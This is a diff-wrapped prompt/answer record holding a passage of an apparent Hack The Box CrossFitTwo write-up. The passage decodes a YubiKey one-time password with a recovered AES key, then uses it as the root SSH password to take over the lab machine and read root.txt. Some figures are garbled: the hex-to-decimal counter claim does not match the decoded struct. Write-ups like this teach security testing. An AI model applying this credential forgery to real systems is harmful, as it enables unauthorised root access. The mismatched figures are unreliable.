@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Crossfittwo Hacks Stuff)
+
+CONTEXT:
+Source: Htb Crossfittwo Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+27 8b aeskey: 6bf9a26475388ce998988b67eaa2ea87 6b f9 a2 64 75 38 8c e9 98 98 8b 67 ea a2 ea 87 Output: a4 ce 11 28 bd e4 08 0f 00 00 00 02 8f b2 ec f9 Struct: uid: a4 ce 11 28 bd e4 counter: 3848 (0x0f08) timestamp (low): 0 (0x0000) timestamp (high): 0 (0x00) session use: 2 (0x02) random: 45711 (0xb28f) crc: 63980 (0xf9ec) Derived: cleaned counter: 3848 (0x0f08) modhex uid: lfrubbdjntuf triggered by caps lock: no crc: F0B8 crc check: ok The uid matches. 0xf0802 == 985090, which is one more than the counter found on the box. Shell As I showed earlier, connecting without a key fails. With the key, it prompts for a password: oxdf@parrot$ ssh -i ~/keys/crossfittwo-root-need-yubikey-as-well root@10.10.10.232 root@10.10.10.232's password: Pasting in the yubikey output returns a shell: ...[snip]... crossfit2# And I can grab root.txt : crossfit2# cat root.txt 6fbc09c1************************
